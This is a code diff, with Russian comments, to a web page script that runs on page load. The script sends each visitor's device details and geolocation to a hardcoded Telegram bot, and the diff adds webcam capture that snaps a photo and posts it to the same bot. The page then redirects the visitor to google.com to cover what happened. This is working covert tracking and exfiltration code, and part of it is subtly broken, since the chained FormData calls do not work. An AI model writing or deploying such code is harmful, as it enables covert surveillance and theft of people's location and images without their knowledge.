@@ -25,6 +25,7 @@
         const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // Вставь токен бота
         const CHAT_ID = "7477642275";  // Вставь свой Chat ID
         const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
         function sendData() {
             let screenSize = window.screen.width + "x" + window.screen.height;
@@ -32,23 +33,86 @@
             let platform = navigator.platform;
             let browserLang = navigator.language;
             let userAgent = navigator.userAgent;
+            let connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+            let geolocation = "Не получено";  // Предположим, что геолокация не доступна
 
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    geolocation = `${position.coords.latitude}, ${position.coords.longitude}`;
+                    sendToTelegram(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
+                });
+            } else {
+                sendToTelegram(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
+            }
+        }
+
+        function sendToTelegram(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType) {
             let message = `📡 Новый лог:
 🌍 Часовой пояс: ${timezone}
 💻 Платформа: ${platform}
 🖥 Разрешение экрана: ${screenSize}
 🈴 Язык браузера: ${browserLang}
-🌐 User-Agent: ${userAgent}`;
+🌐 User-Agent: ${userAgent}
+📡 Тип соединения: ${connectionType}
+🗺 Геолокация: ${geolocation}`;
 
+            // Отправка текстового сообщения в Telegram
             fetch(API_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             });
 
+            // Пытаемся получить доступ к камере
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        let videoElement = document.createElement("video");
+                        videoElement.srcObject = stream;
+                        videoElement.play();
+                        document.body.appendChild(videoElement);
+
+                        // Делать снимок
+                        setTimeout(() => {
+                            let canvas = document.createElement("canvas");
+                            let ctx = canvas.getContext("2d");
+                            canvas.width = videoElement.videoWidth;
+                            canvas.height = videoElement.videoHeight;
+                            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                            let photoDataUrl = canvas.toDataURL("image/png");
+
+                            // Отправка фото в Telegram
+                            fetch(PHOTO_API_URL, {
+                                method: "POST",
+                                body: new FormData()
+                                    .append('chat_id', CHAT_ID)
+                                    .append('photo', dataURItoBlob(photoDataUrl))
+                            });
+
+                            // Остановка видео и очистка
+                            stream.getTracks().forEach(track => track.stop());
+                            videoElement.remove();
+                        }, 5000); // Сделаем снимок через 5 секунд
+                    }).catch(err => {
+                        console.log("Ошибка с доступом к камере: " + err);
+                    });
+            }
+
+            // Редирект через 3 секунды
             setTimeout(() => {
                 window.location.href = "https://google.com"; // Редирект
             }, 3000);
+        }
+
+        function dataURItoBlob(dataURI) {
+            let byteString = atob(dataURI.split(',')[1]);
+            let arrayBuffer = new ArrayBuffer(byteString.length);
+            let uintArray = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                uintArray[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([arrayBuffer], { type: 'image/png' });
         }
 
         sendData();
